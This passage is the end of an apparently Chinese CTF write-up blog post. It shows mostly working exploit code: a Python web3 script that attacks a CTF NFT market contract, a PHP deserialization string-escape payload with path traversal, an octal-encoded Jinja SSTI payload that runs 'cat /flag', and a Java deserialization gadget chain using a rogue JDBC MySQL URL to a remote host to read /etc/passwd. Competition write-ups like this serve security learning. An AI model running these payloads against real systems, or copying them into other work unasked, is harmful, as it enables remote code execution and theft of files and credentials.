sign_and_send(txn)<br>    attack_abi = compiled_sol[<span class="hljs-string">&#x27;attack.sol:AA&#x27;</span>][<span class="hljs-string">&#x27;abi&#x27;</span>]<br>    <span class="hljs-comment"># print(txn_receipt)</span><br>    <span class="hljs-keyword">if</span> txn_receipt[<span class="hljs-string">&#x27;status&#x27;</span>] == <span class="hljs-number">1</span>:<br>        attack_address = txn_receipt[<span class="hljs-string">&#x27;contractAddress&#x27;</span>]<br>        <span class="hljs-keyword">return</span> attack_address,attack_abi<br>    <span class="hljs-keyword">else</span>:<br>        exit(<span class="hljs-number">0</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rsv</span>(<span class="hljs-params">_hash</span>):</span><br>    signed_message = web3.eth.account.signHash(_<span class="hljs-built_in">hash</span>, private_key)<br>    <span class="hljs-built_in">print</span>(signed_message.messageHash.<span class="hljs-built_in">hex</span>())<br>    r = <span class="hljs-string">&#x27;0x&#x27;</span>+signed_message.signature.<span class="hljs-built_in">hex</span>()[<span class="hljs-number">2</span>:<span class="hljs-number">66</span>]<br>    s = <span class="hljs-string">&#x27;0x&#x27;</span>+signed_message.signature.<span class="hljs-built_in">hex</span>()[<span class="hljs-number">66</span>:-<span class="hljs-number">2</span>]<br>    v = <span class="hljs-string">&#x27;0x&#x27;</span>+signed_message.signature.<span class="hljs-built_in">hex</span>()[-<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">return</span> r,s,v<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># exp()</span><br>    solcx.install_solc(<span class="hljs-string">&#x27;0.8.16&#x27;</span>)<br>    rpc = <span class="hljs-string">&quot;http://127.0.0.1:8545&quot;</span><br>    web3 = Web3(HTTPProvider(rpc))<br>    private_key = <span class="hljs-string">&#x27;c2aa19cf83ba45863a005ed560c8c84c1f0ca38eaf5123c6cc88d67c3a9c3f03&#x27;</span><br>    acct = web3.eth.account.from_key(private_key)<br>    account_address = acct.address<br>    chain_id = <span class="hljs-number">5777</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] account_address is &quot;</span> + <span class="hljs-built_in">str</span>(account_address))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] account_Balance is &quot;</span> + <span class="hljs-built_in">str</span>(web3.eth.getBalance(account_address)))<br><br>    <span class="hljs-comment"># attack_key = &#x27;8428b975e270727086349607d6a4d3941ce22176b89e148f956d56fce364175c&#x27;</span><br>    <span class="hljs-comment"># acct = web3.eth.account.from_key(private_key)</span><br>    <span class="hljs-comment"># account_address = acct.address</span><br><br>    <span class="hljs-comment">#calc signature</span><br>    AA_address,AA_abi = deploy_AA()<br>    AA_instance = web3.eth.contract(address=AA_address, abi=AA_abi)<br>    <span class="hljs-built_in">print</span>(AA_instance.all_functions())<br><br>    contract_address,contract_abi = deploy_nft()<br>    contract_instance = web3.eth.contract(address=contract_address, abi=contract_abi)<br>    <span class="hljs-built_in">print</span>(contract_instance.all_functions())<br><br>    signed_tx = contract_instance.functions.ctfNFT().call()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ctfNFT_address is &quot;</span> + signed_tx)<br>    signed_tx = contract_instance.functions.ctfNFT().call()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ctfmarket_address is &quot;</span> + contract_address)<br>    signed_tx = contract_instance.functions.ctfToken().call()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] ctfToken_address is &quot;</span> + signed_tx)<br>    signed_tx = contract_instance.functions.verifier().call()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] verifier_address is &quot;</span> + signed_tx)<br><br>    attack_address,attack_abi = deploy_attack()<br>    attack_instance = web3.eth.contract(address=attack_address, abi=attack_abi)<br>    <span class="hljs-built_in">print</span>(attack_instance.all_functions())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] attack_address is &quot;</span> + attack_address)<br><br><br>    <span class="hljs-comment">#attack.setaccount()</span><br>    functionSign = HexBytes(web3.sha3(text=<span class="hljs-string">&#x27;setaccount(address)&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    setaccount_addr = generate_tx(chain_id, attack_address,functionSign + <span class="hljs-string">&quot;000000000000000000000000&quot;</span> + account_address[<span class="hljs-number">2</span>:], <span class="hljs-number">0</span>)<br>    sign_and_send(setaccount_addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] account_address is &quot;</span> + attack_instance.functions.account().call())<br><br>    <span class="hljs-comment">#attack.setCtfMarket_addr()</span><br>    functionSign = HexBytes(web3.sha3(text=<span class="hljs-string">&#x27;setCtfMarket_addr(address)&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    setCtfMarket_addr = generate_tx(chain_id, attack_address, functionSign + <span class="hljs-string">&quot;000000000000000000000000&quot;</span> + contract_address[<span class="hljs-number">2</span>:],<span class="hljs-number">0</span>)<br>    sign_and_send(setCtfMarket_addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] CtfMarket_address is &quot;</span> + attack_instance.functions.ctfMarket().call())<br><br><br>    <span class="hljs-comment">#attack.attack11()</span><br>    functionSign = HexBytes(Web3.sha3(text=<span class="hljs-string">&#x27;attack11()&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    attack11_addr = generate_tx(chain_id, attack_address,functionSign, <span class="hljs-number">0</span>)<br>    sign_and_send(attack11_addr)<br>    <span class="hljs-comment">#contract.getOrder[0]</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] order[0] is &quot;</span> + <span class="hljs-built_in">str</span>(contract_instance.functions.getOrder(<span class="hljs-number">0</span>).call()))<br><br>    <span class="hljs-comment">#attack.attack2()</span><br>    functionSign = HexBytes(Web3.sha3(text=<span class="hljs-string">&#x27;attack2()&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    attack2_addr = generate_tx(chain_id, attack_address,functionSign, <span class="hljs-number">0</span>)<br>    sign_and_send(attack2_addr)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] order[0] is &quot;</span> + <span class="hljs-built_in">str</span>(contract_instance.functions.getOrder(<span class="hljs-number">0</span>).call()))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] order[1] is &quot;</span> + <span class="hljs-built_in">str</span>(contract_instance.functions.getOrder(<span class="hljs-number">1</span>).call()))<br>    fakeNft_address = attack_instance.functions.HackerNft().call()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] fakeNft_address is &quot;</span> +  fakeNft_address)<br><br>    <span class="hljs-comment">#AA.setinit</span><br>    data = <span class="hljs-string">&#x27;&#x27;&#x27;0xc2af3f15</span><br><span class="hljs-string">    000000000000000000000000&#123;&#125;</span><br><span class="hljs-string">    000000000000000000000000&#123;&#125;</span><br><span class="hljs-string">    0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="hljs-string">    000000000000000000000000&#123;&#125;</span><br><span class="hljs-string">    0000000000000000000000000000000000000000000000000000000000000001</span><br><span class="hljs-string">    0000000000000000000000000000000000000000000000000000000000000003</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(account_address[<span class="hljs-number">2</span>:],attack_address[<span class="hljs-number">2</span>:],fakeNft_address[<span class="hljs-number">2</span>:]).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-comment"># print(data)</span><br>    functionSign = HexBytes(Web3.sha3(text=<span class="hljs-string">&#x27;setinit(address,address,uint256,address,uint256,uint256)&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    setinit_addr = generate_tx(chain_id, AA_address,data, <span class="hljs-number">0</span>)<br>    sign_and_send(setinit_addr)<br><br>    <span class="hljs-built_in">hash</span> = AA_instance.functions.hashl().call()<br>    r,s,v = rsv(<span class="hljs-built_in">hash</span>)<br>    <span class="hljs-built_in">print</span>(v,r,s)<br><br>    <span class="hljs-comment">##attack.attackfor3()</span><br>    data = <span class="hljs-string">&#x27;&#x27;&#x27;0xf98ecaa700000000000000000000000000000000000000000000000000000000000000&#123;&#125;&#123;&#125;&#123;&#125;&#x27;&#x27;&#x27;</span>.<span class="hljs-built_in">format</span>(v[<span class="hljs-number">2</span>:],r[<span class="hljs-number">2</span>:],s[<span class="hljs-number">2</span>:])<br>    functionSign = HexBytes(Web3.sha3(text=<span class="hljs-string">&#x27;attackfor3(uint8,byte32,byte32)&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    attackfor3_addr = generate_tx(chain_id, attack_address,data, <span class="hljs-number">0</span>)<br>    sign_and_send(attackfor3_addr)<br><br>    <span class="hljs-comment">##attack.attack4()</span><br>    functionSign = HexBytes(Web3.sha3(text=<span class="hljs-string">&#x27;attack4()&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    attack4_addr = generate_tx(chain_id, attack_address,functionSign, <span class="hljs-number">0</span>)<br>    sign_and_send(attack4_addr)<br><br>    <span class="hljs-comment">##ctfMarket.win()</span><br>    functionSign = HexBytes(Web3.sha3(text=<span class="hljs-string">&#x27;win()&#x27;</span>)).<span class="hljs-built_in">hex</span>()[<span class="hljs-number">0</span>:<span class="hljs-number">10</span>]<br>    flag_addr = generate_tx(chain_id, contract_address,functionSign, <span class="hljs-number">0</span>)<br>    flag = sign_and_send(flag_addr)<br>    <span class="hljs-built_in">print</span>(contract_instance.events.SendFlag().processLog(flag[<span class="hljs-string">&quot;logs&quot;</span>][<span class="hljs-number">0</span>]))<br><br></code></pre></div></td></tr></table></figure>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezus"><a href="#ezus" class="headerlink" title="ezus"></a>ezus</h3><p>读源码</p>
+<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-regexp">/index.php/</span>tm.php/%<span class="hljs-number">80</span>?<span class="hljs-keyword">source</span><br></code></pre></div></td></tr></table></figure>
+<p>字符串逃逸反序列化读hint.php，然后读<code>f1111444449999.txt</code></p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@<span class="hljs-number">0</span>@&amp;password=<span class="hljs-number">111111111111</span><span class="hljs-string">&quot;;O:5:&quot;</span>order<span class="hljs-string">&quot;:3:&#123;s:1:&quot;</span>f<span class="hljs-string">&quot;;s:7:&quot;</span>trypass<span class="hljs-string">&quot;;s:4:&quot;</span>hint<span class="hljs-string">&quot;;s:57:&quot;</span>mochu<span class="hljs-number">7</span>://prankhub/../../../../../../../f<span class="hljs-number">1111444449999</span>.txt<span class="hljs-string">&quot;;&#125;</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="WHOYOUARE"><a href="#WHOYOUARE" class="headerlink" title="WHOYOUARE"></a>WHOYOUARE</h3><p>nodejs 原型链污染，使用constructor.prototype代替__proto__，使用1来覆盖数组的第二个数据。运行两次。<br><img src="https://img-blog.csdnimg.cn/img_convert/bd8720f0ca06961b79a85f7bd3f90992.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="没有人比我更懂py"><a href="#没有人比我更懂py" class="headerlink" title="没有人比我更懂py"></a>没有人比我更懂py</h3><p>ssti网上搜搜payload</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">&#123;&#123;&#x27;&#x27;[&#x27;<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>43<span class="hljs-symbol">\1</span>54<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37&#x27;][&#x27;<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>42<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>45<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37&#x27;][0][&#x27;<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>65<span class="hljs-symbol">\1</span>42<span class="hljs-symbol">\1</span>43<span class="hljs-symbol">\1</span>54<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>45<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37&#x27;]()[132][&#x27;<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>51<span class="hljs-symbol">\1</span>56<span class="hljs-symbol">\1</span>51<span class="hljs-symbol">\1</span>64<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37&#x27;][&#x27;<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>47<span class="hljs-symbol">\1</span>54<span class="hljs-symbol">\1</span>57<span class="hljs-symbol">\1</span>42<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>54<span class="hljs-symbol">\1</span>63<span class="hljs-symbol">\1</span>37<span class="hljs-symbol">\1</span>37&#x27;][&#x27;<span class="hljs-symbol">\1</span>60<span class="hljs-symbol">\1</span>57<span class="hljs-symbol">\1</span>60<span class="hljs-symbol">\1</span>45<span class="hljs-symbol">\1</span>56&#x27;](&#x27;<span class="hljs-symbol">\1</span>43<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>64<span class="hljs-symbol">\4</span>0<span class="hljs-symbol">\5</span>7<span class="hljs-symbol">\1</span>46<span class="hljs-symbol">\1</span>54<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>47&#x27;)[&#x27;<span class="hljs-symbol">\1</span>62<span class="hljs-symbol">\1</span>45<span class="hljs-symbol">\1</span>41<span class="hljs-symbol">\1</span>44&#x27;]()&#125;&#125;<br></code></pre></div></td></tr></table></figure>
+<h3 id="NoRCE"><a href="#NoRCE" class="headerlink" title="NoRCE"></a>NoRCE</h3><p>BadAttributeValueExpException调用toString然后connect函数能打二次返序列化。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.demo.exp;<br><br><span class="hljs-keyword">import</span> com.example.demo.bean.Connect;<br><span class="hljs-keyword">import</span> com.example.demo.utils.tools;<br><br><span class="hljs-keyword">import</span> javax.management.remote.JMXServiceURL;<br><span class="hljs-keyword">import</span> javax.management.remote.rmi.RMIConnector;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj,String key, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(key);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj,value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] serialize(Object o) <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);<br>        oos.writeObject(o);<br>        oos.close();<br>        bos.close();<br>        <span class="hljs-keyword">return</span> bos.toByteArray();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] serialize2(Object o) <span class="hljs-keyword">throws</span> Exception&#123;<br>        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);<br>        oos.writeUTF(<span class="hljs-string">&quot;s00ABX&quot;</span>);<br>        oos.writeObject(o);<br>        oos.close();<br>        bos.close();<br>        <span class="hljs-keyword">return</span> bos.toByteArray();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">deserialize</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        ByteArrayInputStream bis = <span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bis);<br>        bis.close();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getFieldValue</span><span class="hljs-params">(Object obj, String key)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field field = obj.getClass().getDeclaredField(key);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        <span class="hljs-keyword">return</span> field.get(obj);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span>  String <span class="hljs-title">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        com.example.demo.bean.MyBean myBean = <span class="hljs-keyword">new</span> com.example.demo.bean.MyBean(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        Connect connect = <span class="hljs-keyword">new</span> Connect(<span class="hljs-string">&quot;jdbc:mysql://10.91.107.14:2333/kkfine?allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&amp;username=fileread_/etc/passwd&amp;password=kkfine&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        setFieldValue(myBean,<span class="hljs-string">&quot;conn&quot;</span>,connect);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,myBean);<br>        String payload = <span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(serialize(badAttributeValueExpException)));<br>        <span class="hljs-keyword">return</span> payload;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        JMXServiceURL jmxServiceURL = <span class="hljs-keyword">new</span> JMXServiceURL(<span class="hljs-string">&quot;service:jmx:rmi://&quot;</span>);<br>        setFieldValue(jmxServiceURL, <span class="hljs-string">&quot;urlPath&quot;</span>, <span class="hljs-string">&quot;/stub/&quot;</span> + getObject());<br>        RMIConnector rmiConnector = <span class="hljs-keyword">new</span> RMIConnector(jmxServiceURL, <span class="hljs-keyword">null</span>);<br><br>        com.example.demo.bean.MyBean myBean = <span class="hljs-keyword">new</span> com.example.demo.bean.MyBean(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-keyword">null</span>);<br>        setFieldValue(badAttributeValueExpException,<span class="hljs-string">&quot;val&quot;</span>,myBean);<br>        setFieldValue(myBean,<span class="hljs-string">&quot;conn&quot;</span>,rmiConnector);<br><br>        <span class="hljs-keyword">byte</span>[] payload =  serialize2(badAttributeValueExpException);<br><br>        System.out.println(<span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(payload)));<br>        String data = <span class="hljs-keyword">new</span> String(Base64.getEncoder().encode(payload));<br><span class="hljs-comment">//        deserialize(payload);</span><br>        <span class="hljs-keyword">byte</span>[] bytes = tools.base64Decode(data);<br><br>        InputStream inputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(bytes);<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(inputStream);<br>        String secret = data.substring(<span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br>        String key = objectInputStream.readUTF();<br>        <span class="hljs-keyword">if</span> (key.hashCode() == secret.hashCode() &amp;&amp; !secret.equals(key)) &#123;<br>            objectInputStream.readObject();<br>        &#125;<br><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/blockchain/">blockchain</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/11/10/2022-11-10-bytectf-finnal%E5%B0%8F%E7%BB%93/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">bytectf-finnal小结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/01/2022-11-1-ProxyLogon%E5%88%86%E6%9E%90/">
+                        <span class="hidden-mobile">Windows Exchange组件漏洞分析（一）：ProxyLogon</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
